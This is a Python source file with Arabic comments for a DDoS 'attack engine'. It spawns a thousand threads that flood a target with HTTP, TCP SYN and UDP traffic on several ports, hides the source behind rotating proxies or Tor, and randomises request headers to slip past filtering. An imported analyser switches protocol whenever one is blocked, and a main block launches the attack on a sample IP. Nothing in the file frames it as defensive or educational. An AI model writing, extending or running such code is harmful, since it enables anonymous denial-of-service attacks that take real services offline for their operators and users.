import threading
import time
import random
from core import proxy_rotator, tor_rotator  # توقع أن tor_rotator يُعيد socks5
from protocols import http_flood, tcp_syn, udp_flood
from core.ai_analyzer import AIAttackAnalyzer


class AttackEngine:
    def __init__(self, target_ip, ports, threads=1000, use_tor=False):
        self.target_ip = target_ip
        self.ports = ports
        self.threads_count = threads
        self.protocols = ["HTTP", "TCP", "UDP"]
        self.protocol_status = {p: True for p in self.protocols}
        self.current_protocol = "HTTP"
        self.running = False
        self.active_threads = []
        self.lock = threading.Lock()

        self.use_tor = use_tor

        self.ai_analyzer = AIAttackAnalyzer(
            target_ip=self.target_ip,
            control_callback=self.protocol_change_handler,
            protocols=self.protocols,
            max_blocked_before_switch=3,
            http_port=80,
            tcp_port=80,
            udp_port=80,
            timeout=5,
            check_interval=5
        )

    def protocol_change_handler(self, new_protocol):
        with self.lock:
            print(f"[AI] 🔀 تغيير البروتوكول من {self.current_protocol} إلى {new_protocol}")
            self.current_protocol = new_protocol
            for p in self.protocol_status:
                self.protocol_status[p] = (p == new_protocol)

    def start(self):
        self.running = True
        print(f"[Engine] 🚀 بدء الهجوم على {self.target_ip} بـ {self.threads_count} خيوط عبر {self.ports}")

        self.ai_analyzer.start()

        for port in self.ports:
            for _ in range(self.threads_count // len(self.ports)):
                t = threading.Thread(target=self.attack_thread, args=(port,))
                t.daemon = True
                t.start()
                self.active_threads.append(t)

    def stop(self):
        print("[Engine] ⏹️ إيقاف الهجوم...")
        self.running = False
        self.ai_analyzer.stop()
        self.ai_analyzer.join()
        for t in self.active_threads:
            if t.is_alive():
                t.join(timeout=1)
        print("[Engine] ✅ تم الإيقاف الكامل.")

    def attack_thread(self, port):
        while self.running:
            with self.lock:
                protocol = self.current_protocol
                enabled = self.protocol_status.get(protocol, False)

            if not enabled:
                time.sleep(0.1)
                continue

            # احصل على بروكسي من وحدة البروكسي أو TOR
            proxy = None
            if self.use_tor:
                proxy = tor_rotator.get_tor_proxy()
            else:
                proxy = proxy_rotator.get_random_proxy()

            try:
                if protocol == "HTTP":
                    headers = self.random_headers()
                    http_flood.attack(self.target_ip, port, headers=headers, proxy=proxy, use_async=True)
                elif protocol == "TCP":
                    tcp_syn.attack(self.target_ip, port, packet_size=1024, ip_source=proxy)
                elif protocol == "UDP":
                    udp_flood.attack(self.target_ip, port, packet_size=512, ip_source=proxy)
                else:
                    time.sleep(0.05)
            except Exception as e:
                print(f"[Engine] ⚠️ خطأ في {protocol} على المنفذ {port}: {e}")

            time.sleep(0.001)

    @staticmethod
    def random_headers():
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)"
        ]
        return {
            "User-Agent": random.choice(user_agents),
            "Referer": "https://google.com/search?q=" + str(random.randint(1000, 9999)),
            "Cookie": "session=" + str(random.randint(100000, 999999))
        }


if __name__ == "__main__":
    engine = AttackEngine(
        target_ip="1.2.3.4",
        ports=[80, 443, 8080],
        threads=1000,
        use_tor=True  # 🔒 لتشغيل TOR Socks5 تلقائياً
    )
    try:
        engine.start()
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        engine.stop()
